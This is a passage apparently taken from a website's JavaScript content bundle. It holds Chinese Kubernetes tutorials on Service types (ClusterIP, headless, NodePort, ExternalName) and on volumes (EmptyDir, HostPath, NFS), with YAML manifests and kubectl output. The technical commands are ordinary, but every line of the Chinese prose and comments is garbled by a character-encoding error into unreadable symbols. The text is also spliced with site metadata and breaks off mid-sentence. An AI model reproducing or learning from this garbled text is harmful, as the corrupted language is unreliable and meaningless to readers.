sessionaffinity: # sessionäº²åæ§ï¼æ¯æclientipãnoneä¸¤ä¸ªéé¡¹ï¼å¯ä»¥æåä¸ä¸ªæºçè¯·æ±ï¼åå°ä¸ä¸ªå·ä½çpodä¸\n  ports: # ç«¯å£ä¿¡æ¯\n    - protocol: tcp \n      port: 3017  # serviceç«¯å£\n      targetport: 5003 # podç«¯å£\n      nodeport: 31122 # ä¸»æºç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntypeï¼\n\n * clusteripï¼é»è®¤å¼ï¼å®æ¯ kubernetes ç³»ç»èªå¨åéçèæ ipï¼åªè½å¨éç¾¤åé¨è®¿é®\n * nodeportï¼å° service éè¿æå®ç node ä¸çç«¯å£æ´é²ç»å¤é¨ï¼éè¿æ­¤æ¹æ³ï¼å°±å¯ä»¥å¨éç¾¤å¤é¨è®¿é®æå¡\n * loadbalancerï¼ä½¿ç¨å¤æ¥è´è½½åè¡¡å¨å®æå°æå¡çè´è½½ååï¼æ³¨ææ­¤æ¨¡å¼éè¦å¤é¨äºç¯å¢æ¯æ\n * externalnameï¼ æéç¾¤å¤é¨çæå¡å¼å¥éç¾¤åé¨ï¼ç´æ¥ä½¿ç¨\n\n\n# service ä½¿ç¨\n\n\n# å®éªç¯å¢åå¤\n\nå¨ä½¿ç¨ service ä¹åï¼é¦åå©ç¨ deployment åå»ºåº 3 ä¸ª podï¼æ³¨æè¦ä¸º pod è®¾ç½® app=nginx-pod çæ ç­¾\nåå»º deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                             ready   status     ip            node     labels\npc-deployment-66cb59b984-8p84h   1/1     running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     running    10.244.1.40   node1    app=nginx-pod\n\n# ä¸ºäºæ¹ä¾¿åé¢çæµè¯ï¼ä¿®æ¹ä¸ä¸å°nginxçindex.htmlé¡µé¢ï¼ä¸å°ä¿®æ¹çipå°åä¸ä¸è´ï¼\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#ä¿®æ¹å®æ¯ä¹åï¼è®¿é®æµè¯\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# clusterip ç±»åç service\n\næ¯éç¾¤åé¨å°åï¼åªè½éè¿ node éç¾¤åé¨è®¿é®ï¼åå»º service-clusterip.yaml æä»¶\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: 10.97.97.97 # serviceçipå°åï¼å¦æä¸åï¼é»è®¤ä¼çæä¸ä¸ª\n  type: clusterip\n  ports:\n  - port: 80  # serviceç«¯å£       \n    targetport: 80 # podç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname                type        cluster-ip    external-ip   port(s)   age   selector\nservice-clusterip   clusterip   10.97.97.97   <none>        80/tcp    13s   app=nginx-pod\n\n# æ¥çserviceçè¯¦ç»ä¿¡æ¯\n# å¨è¿éæä¸ä¸ªendpointsåè¡¨ï¼éé¢å°±æ¯å½åserviceå¯ä»¥è´è½½å°çæå¡å¥å£\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nname:              service-clusterip\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                10.97.97.97\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# æ¥çipvsçæ å°è§å\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# è®¿é®10.97.97.97:80è§å¯ææ\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nendpoint\n\nendpoint æ¯ kubernetes ä¸­çä¸ä¸ªèµæºå¯¹è±¡ï¼å­å¨å¨ etcd ä¸­ï¼ç¨æ¥è®°å½ä¸ä¸ª service å¯¹åºçææ pod çè®¿é®å°åï¼å®æ¯æ ¹æ® service éç½®æä»¶ä¸­ selector æè¿°äº§ççã\n\nä¸ä¸ª service ç±ä¸ç» pod ç»æï¼è¿äº pod éè¿ endpoints æ´é²åºæ¥ï¼endpoints æ¯å®ç°å®éæå¡çç«¯ç¹éåãæ¢å¥è¯è¯´ï¼service å pod ä¹é´çèç³»æ¯éè¿ endpoints å®ç°çã\n\n\n\nè´è½½ååç­ç¥\nå¯¹ service çè®¿é®è¢«ååå°äºåç«¯ç pod ä¸å»ï¼ç®å kubernetes æä¾äºä¸¤ç§è´è½½ååç­ç¥ï¼\n\n * å¦æä¸å®ä¹ï¼é»è®¤ä½¿ç¨ kube-proxy çç­ç¥ï¼æ¯å¦éæºãè½®è¯¢\n * åºäºå®¢æ·ç«¯å°åçä¼è¯ä¿ææ¨¡å¼ï¼å³æ¥èªåä¸ä¸ªå®¢æ·ç«¯åèµ·çææè¯·æ±é½ä¼è½¬åå°åºå®çä¸ä¸ª pod ä¸\n   æ­¤æ¨¡å¼å¯ä»¥ä½¿å¨ spec ä¸­æ·»å  sessionaffinity:clientip éé¡¹\n\n# æ¥çipvsçæ å°è§åãrr è½®è¯¢ã\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# ä¿®æ¹ååç­ç¥----sessionaffinity:clientip\n\n# æ¥çipvsè§åãpersistent ä»£è¡¨æä¹ã\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# å é¤service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# headliness ç±»åç service\n\nå¨æäºåºæ¯ä¸­ï¼å¼åäººåå¯è½ä¸æ³ä½¿ç¨ service æä¾çè´è½½åè¡¡åè½ï¼èå¸æèªå·±æ¥æ§å¶è´è½½åè¡¡ç­ç¥ï¼éå¯¹è¿ç§æåµï¼kubernetes æä¾äº headliness serviceï¼è¿ç±» service ä¸ä¼åé cluster ipï¼å¦ææ³è¦è®¿é® serviceï¼åªè½éè¿ service çååè¿è¡æ¥è¯¢ã\n\nåå»º service-headliness.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none # å°clusteripè®¾ç½®ä¸ºnoneï¼å³å¯åå»ºheadliness service\n  type: clusterip\n  ports:\n  - port: 80    \n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# è·åserviceï¼ åç°cluster-ipæªåé\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nname                 type        cluster-ip   external-ip   port(s)   age   selector\nservice-headliness   clusterip   none         <none>        80/tcp    11s   app=nginx-pod\n\n# æ¥çserviceè¯¦æ\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nname:              service-headliness\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                none\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# æ¥çååçè§£ææåµ\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# nodeport ç±»åç service\n\nå¨ä¹åçæ ·ä¾ä¸­ï¼åå»ºç service ç ip å°ååªæéç¾¤åé¨æå¯ä»¥è®¿é®ï¼å¦æå¸æå° service æ´é²ç»éç¾¤å¤é¨ä½¿ç¨ï¼é£ä¹å°±è¦ä½¿ç¨å°å¦å¤ä¸ç§ç±»åç serviceï¼ç§°ä¸º nodeport ç±»åãnodeport çå·¥ä½åçå¶å®å°±æ¯å° service çç«¯å£æ å°å° node çä¸ä¸ªç«¯å£ä¸ï¼ç¶åå°±å¯ä»¥éè¿ nodeip:nodeport æ¥è®¿é® service äºã\n\n\n\nåå»º service-nodeport.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: nodeport # serviceç±»å\n  ports:\n  - port: 80\n    nodeport: 30002 # æå®ç»å®çnodeçç«¯å£(é»è®¤çåå¼èå´æ¯ï¼30000-32767), å¦æä¸æå®ï¼ä¼é»è®¤åé\n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname               type       cluster-ip      external-ip   port(s)       selector\nservice-nodeport   nodeport   10.105.64.191   <none>        80:30002/tcp  app=nginx-pod\n\n# æ¥ä¸æ¥å¯ä»¥éè¿çµèä¸»æºçæµè§å¨å»è®¿é®éç¾¤ä¸­ä»»æä¸ä¸ªnodeipç30002ç«¯å£ï¼å³å¯è®¿é®å°pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# loadbalancer ç±»åç service\n\nloadbalancer å nodeport å¾ç¸ä¼¼ï¼ç®çé½æ¯åå¤é¨æ´é²ä¸ä¸ªç«¯å£ï¼åºå«å¨äº loadbalancer ä¼å¨éç¾¤çå¤é¨åæ¥åä¸ä¸ªè´è½½åè¡¡è®¾å¤ï¼èè¿ä¸ªè®¾å¤éè¦å¤é¨ç¯å¢æ¯æçï¼å¤é¨æå¡åéå°è¿ä¸ªè®¾å¤ä¸çè¯·æ±ï¼ä¼è¢«è®¾å¤è´è½½ä¹åè½¬åå°éç¾¤ä¸­ã\n\n\n\n\n# externalname ç±»åç service\n\nexternalname ç±»åç service ç¨äºå¼å¥éç¾¤å¤é¨çæå¡ï¼å®éè¿ externalname å±æ§æå®å¤é¨ä¸ä¸ªæå¡çå°åï¼ç¶åå¨éç¾¤åé¨è®¿é®æ­¤ service å°±å¯ä»¥è®¿é®å°å¤é¨çæå¡äºã\n\n\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: externalname # serviceç±»å\n  externalname: www.baidu.com  #æ¹æipå°åä¹å¯ä»¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# ååè§£æ\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 in cname www.baidu.com.\nwww.baidu.com.          30      in      cname   www.a.shifen.com.\nwww.a.shifen.com.       30      in      a       39.156.66.18\nwww.a.shifen.com.       30      in      a       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',charsets:{cjk:!0}},{title:"kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼",frontmatter:{title:"kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/610",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/610.kubernetes(%E5%8D%81%E4%B8%80)%20%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%EF%BC%88%E6%8C%82%E8%BD%BD%E5%8D%B7%E7%AE%A1%E7%90%86%EF%BC%89.html",relativePath:"04.è¿ç»´/60.Kubernetes/610.kubernetes(åä¸) æ°æ®å­å¨ï¼æè½½å·ç®¡çï¼.md",key:"v-2715e687",path:"/kubernetes/610/",headers:[{level:2,title:"åºæ¬å­å¨",slug:"åºæ¬å­å¨",normalizedTitle:"åºæ¬å­å¨",charIndex:419},{level:3,title:"EmptyDir",slug:"emptydir",normalizedTitle:"emptydir",charIndex:353},{level:3,title:"HostPath",slug:"hostpath",normalizedTitle:"hostpath",charIndex:362},{level:3,title:"NFS",slug:"nfs",normalizedTitle:"nfs",charIndex:371},{level:2,title:"é«çº§å­å¨",slug:"é«çº§å­å¨",normalizedTitle:"é«çº§å­å¨",charIndex:378},{level:3,title:"PV",slug:"pv",normalizedTitle:"pv",charIndex:383},{level:3,title:"PVC",slug:"pvc",normalizedTitle:"pvc",charIndex:386},{level:3,title:"çå½å¨æ",slug:"çå½å¨æ",normalizedTitle:"çå½å¨æ",charIndex:11},{level:2,title:"éç½®å­å¨",slug:"éç½®å­å¨",normalizedTitle:"éç½®å­å¨",charIndex:393},{level:3,title:"ConfigMap",slug:"configmap",normalizedTitle:"configmap",charIndex:398},{level:3,title:"Secret",slug:"secret",normalizedTitle:"secret",charIndex:408}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"åºæ¬å­å¨ EmptyDir HostPath NFS é«çº§å­å¨ PV PVC çå½å¨æ éç½®å­å¨ ConfigMap Secret",content:'å¨åé¢å·²ç»æå°ï¼å®¹å¨ççå½å¨æå¯è½å¾ç­ï¼ä¼è¢«é¢ç¹å°åå»ºåéæ¯ãé£ä¹å®¹å¨å¨éæ¯æ¶ï¼ä¿å­å¨å®¹å¨ä¸­çæ°æ®ä¹ä¼è¢«æ¸é¤ãè¿ç§ç»æå¯¹ç¨æ·æ¥è¯´ï¼å¨æäºæåµä¸æ¯ä¸ä¹æçå°çãä¸ºäºæä¹åä¿å­å®¹å¨çæ°æ®ï¼kubernetes å¼å¥äº Volume çæ¦å¿µã\n\nVolume æ¯ Pod ä¸­è½å¤è¢«å¤ä¸ªå®¹å¨è®¿é®çå±äº«ç®å½ï¼å®è¢«å®ä¹å¨ Pod ä¸ï¼ç¶åè¢«ä¸ä¸ª Pod éçå¤ä¸ªå®¹å¨æè½½å°å·ä½çæä»¶ç®å½ä¸ï¼kubernetes éè¿ Volume å®ç°åä¸ä¸ª Pod ä¸­ä¸åå®¹å¨ä¹é´çæ°æ®å±äº«ä»¥åæ°æ®çæä¹åå­å¨ãVolume ççå½å®¹å¨ä¸ä¸ Pod ä¸­åä¸ªå®¹å¨ççå½å¨æç¸å³ï¼å½å®¹å¨ç»æ­¢æèéå¯æ¶ï¼Volume ä¸­çæ°æ®ä¹ä¸ä¼ä¸¢å¤±ã\n\nkubernetes ç Volume æ¯æå¤ç§ç±»åï¼æ¯è¾å¸¸è§çæä¸é¢å ä¸ªï¼\n\n * ç®åå­å¨ï¼EmptyDirãHostPathãNFS\n * é«çº§å­å¨ï¼PVãPVC\n * éç½®å­å¨ï¼ConfigMapãSecret\n\n\n# åºæ¬å­å¨\n\n\n# EmptyDir\n\nEmptyDir æ¯æåºç¡ç Volume ç±»åï¼ä¸ä¸ª EmptyDir å°±æ¯ Host ä¸çä¸ä¸ªç©ºç®å½ã\n\nEmptyDir æ¯å¨ Pod è¢«åéå° Node æ¶åå»ºçï¼å®çåå§åå®¹ä¸ºç©ºï¼å¹¶ä¸æ é¡»æå®å®¿ä¸»æºä¸å¯¹åºçç®å½æä»¶ï¼å ä¸º kubernetes ä¼èªå¨åéä¸ä¸ªç®å½ï¼å½ Pod éæ¯æ¶ï¼ EmptyDir ä¸­çæ°æ®ä¹ä¼è¢«æ°¸ä¹å é¤ã EmptyDir ç¨éå¦ä¸ï¼\n\n * ä¸´æ¶ç©ºé´ï¼ä¾å¦ç¨äºæäºåºç¨ç¨åºè¿è¡æ¶æéçä¸´æ¶ç®å½ï¼ä¸æ é¡»æ°¸ä¹ä¿ç\n * ä¸ä¸ªå®¹å¨éè¦ä»å¦ä¸ä¸ªå®¹å¨ä¸­è·åæ°æ®çç®å½ï¼å¤å®¹å¨å±äº«ç®å½ï¼\n\næ¥ä¸æ¥ï¼éè¿ä¸ä¸ªå®¹å¨ä¹é´æä»¶å±äº«çæ¡ä¾æ¥ä½¿ç¨ä¸ä¸ EmptyDirã\n\nå¨ä¸ä¸ª Pod ä¸­åå¤ä¸¤ä¸ªå®¹å¨ nginx å busyboxï¼ç¶åå£°æä¸ä¸ª Volume åå«æå¨å°ä¸¤ä¸ªå®¹å¨çç®å½ä¸­ï¼ç¶å nginx å®¹å¨è´è´£å Volume ä¸­åæ¥å¿ï¼busybox ä¸­éè¿å½ä»¤å°æ¥å¿åå®¹è¯»å°æ§å¶å°ã\n\n\n\nåå»ºä¸ä¸ª volume-emptydir.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:  # å°logs-volumeæå¨å°nginxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /var/log/nginx\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # åå§å½ä»¤ï¼å¨æè¯»åæå®æä»¶ä¸­åå®¹\n    volumeMounts:  # å°logs-volume æå¨å°busyboxå®¹å¨ä¸­ï¼å¯¹åºçç®å½ä¸º /logs\n    - name: logs-volume\n      mountPath: /logs\n  volumes: # å£°ævolumeï¼ nameä¸ºlogs-volumeï¼ç±»åä¸ºemptyDir\n  - name: logs-volume\n    emptyDir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE      IP       NODE   ...... \nvolume-emptydir       2/2     Running   0          97s   10.42.2.9   node1  ......\n\n# éè¿podIpè®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# éè¿kubectl logså½ä»¤æ¥çæå®å®¹å¨çæ åè¾åº\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox\n10.42.1.0 - - [27/Jun/2021:15:08:54 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# HostPath\n\nEmptyDir ä¸­æ°æ®ä¸ä¼è¢«æä¹åï¼å®ä¼éç Pod çç»æèéæ¯ï¼å¦ææ³ç®åçå°æ°æ®æä¹åå°ä¸»æºä¸­ï¼å¯ä»¥éæ© HostPathã\n\nHostPath å°±æ¯å° Node ä¸»æºä¸­ä¸ä¸ªå®éç®å½æå¨å° Pod ä¸­ï¼ä»¥ä¾å®¹å¨ä½¿ç¨ï¼è¿æ ·çè®¾è®¡å°±å¯ä»¥ä¿è¯ Pod éæ¯äºï¼ä½æ¯æ°æ®ä¾æ®å¯ä»¥å­å¨äº Node ä¸»æºä¸ã\n\n\n\nåå»ºä¸ä¸ª volume-hostpath.yamlï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    hostPath: \n      path: /root/logs #å®¿ä¸»æºç®å½\n      type: DirectoryOrCreate  # ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> å³äº type çå¼çä¸ç¹è¯´æï¼\n> DirectoryOrCreate ç®å½å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> Directory ç®å½å¿é¡»å­å¨\n> FileOrCreate æä»¶å­å¨å°±ä½¿ç¨ï¼ä¸å­å¨å°±ååå»ºåä½¿ç¨\n> File æä»¶å¿é¡»å­å¨\n> Socket unix å¥æ¥å­å¿é¡»å­å¨\n> CharDevice å­ç¬¦è®¾å¤å¿é¡»å­å¨\n> BlockDevice åè®¾å¤å¿é¡»å­å¨\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# æ¥çPod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE   IP             NODE   ......\npod-volume-hostpath   2/2     Running   0          16s   10.42.2.10     node1  ......\n\n#è®¿é®nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# æ¥ä¸æ¥å°±å¯ä»¥å»hostç/root/logsç®å½ä¸æ¥çå­å¨çæä»¶äº\n###  æ³¨æ: ä¸é¢çæä½éè¦å°Podæå¨çèç¹è¿è¡ï¼æ¡ä¾ä¸­æ¯node1ï¼\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# åæ ·çéçï¼å¦æå¨æ­¤ç®å½ä¸åå»ºä¸ä¸ªæä»¶ï¼å°å®¹å¨ä¸­ä¹æ¯å¯ä»¥çå°ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> æ³¨æï¼Pod è¢« k8s é¨ç½²å¨åªä¸ª Nodeï¼æä»¶å°±å¨é£ä¸ª Node ä¸æè½½\n\n\n# NFS\n\nHostPath å¯ä»¥è§£å³æ°æ®æä¹åçé®é¢ï¼ä½æ¯ä¸æ¦ Node èç¹æéäºï¼Pod å¦æè½¬ç§»å°äºå«çèç¹ï¼åä¼åºç°é®é¢äºï¼æ­¤æ¶éè¦åå¤åç¬çç½ç»å­å¨ç³»ç»ï¼æ¯è¾å¸¸ç¨çç¨ NFSãCIFSã\n\nNFS æ¯ä¸ä¸ªç½ç»æä»¶å­å¨ç³»ç»ï¼å¯ä»¥æ­å»ºä¸å° NFS æå¡å¨ï¼ç¶åå° Pod ä¸­çå­å¨ç´æ¥è¿æ¥å° NFS ç³»ç»ä¸ï¼è¿æ ·çè¯ï¼æ è®º Pod å¨èç¹ä¸æä¹è½¬ç§»ï¼åªè¦ Node è· NFS çå¯¹æ¥æ²¡é®é¢ï¼æ°æ®å°±å¯ä»¥æåè®¿é®ã\n\n\n\n1ï¼é¦åè¦åå¤ nfs çæå¡å¨ï¼è¿éä¸ºäºç®åï¼ç´æ¥æ¯ master èç¹å nfs æå¡å¨\n\n# å¨nfsä¸å®è£nfsæå¡\n[root@nfs ~]# yum install nfs-utils -y\n\n# åå¤ä¸ä¸ªå±äº«ç®å½\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# å°å±äº«ç®å½ä»¥è¯»åæéæ´é²ç»192.168.5.0/24ç½æ®µä¸­çææä¸»æº\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# å¯å¨nfsæå¡\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2ï¼æ¥ä¸æ¥ï¼è¦å¨çæ¯ä¸ª node èç¹ä¸é½å®è£ä¸ nfsï¼è¿æ ·çç®çæ¯ä¸ºäº node èç¹å¯ä»¥é©±å¨ nfs è®¾å¤\n\n# å¨nodeä¸å®è£nfsæå¡ï¼æ³¨æä¸éè¦å¯å¨\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3ï¼æ¥ä¸æ¥ï¼å°±å¯ä»¥ç¼å pod çéç½®æä»¶äºï¼åå»º volume-nfs.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfsæå¡å¨å°å\n      path: /root/data/nfs #å±äº«æä»¶è·¯å¾\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4ï¼æåï¼è¿è¡ä¸ podï¼è§å¯ç»æ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\nvolume-nfs        2/2     Running   0          2m9s\n\n# æ¥çnfsæå¡å¨ä¸çå±äº«ç®å½ï¼åç°å·²ç»ææä»¶äº\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# é«çº§å­å¨\n\nåé¢å·²ç»å­¦ä¹ äºä½¿ç¨ NFS æä¾å­å¨ï¼æ­¤æ¶å°±è¦æ±ç¨æ·ä¼æ­å»º NFS ç³»ç»ï¼å¹¶ä¸ä¼å¨ yaml éç½® nfsãç±äº kubernetes æ¯æçå­å¨ç³»ç»æå¾å¤ï¼è¦æ±å®¢æ·å¨é½ææ¡ï¼æ¾ç¶ä¸ç°å®ãä¸ºäºè½å¤å±è½åºå±å­å¨å®ç°çç»èï¼æ¹ä¾¿ç¨æ·ä½¿ç¨ï¼ kubernetes å¼å¥ PV å PVC ä¸¤ç§èµæºå¯¹è±¡ã\n\nPVï¼Persistent Volumeï¼æ¯æä¹åå·çææï¼æ¯å¯¹åºå±çå±äº«å­å¨çä¸ç§æ½è±¡ãä¸è¬æåµä¸ PV ç± kubernetes ç®¡çåè¿è¡åå»ºåéç½®ï¼å®ä¸åºå±å·ä½çå±äº«å­å¨ææ¯æå